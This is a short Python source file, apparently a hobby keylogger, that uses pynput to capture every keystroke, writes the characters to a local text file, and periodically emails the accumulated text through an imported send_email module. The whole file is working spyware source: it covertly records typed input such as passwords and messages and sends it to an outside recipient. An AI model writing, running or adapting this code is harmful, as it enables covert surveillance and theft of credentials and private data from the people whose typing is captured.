from pynput import keyboard
import Keylogger_That_Emails.send_email as send_email
import webbrowser

message = ""
count = 0
# import keyboard library
def keyPressed(key):
    print(str(key))
    global message, count
    count +=1
    with open("omi.txt",'a') as logKey: #a == append
        try:
            char = key.char
            message+= char
            logKey.write(char)
        except:
            print("NA")
    if count>10:
        count  = 0 # if we dont do this, a new email will be generated for every character we type
        emailkar()
    
def emailkar():
    send_email.sendEmail(message)

# if main method is ready to fire
if __name__ == "__main__": 
    listener = keyboard.Listener(on_press=keyPressed)#create
    #an object that listens to the key presses and upon 
    #a key is pressed, a funtion called keypressd is 
    # *on_press* auto passes key as a paramater
    listener.start()
    input()#start taking strings as input
    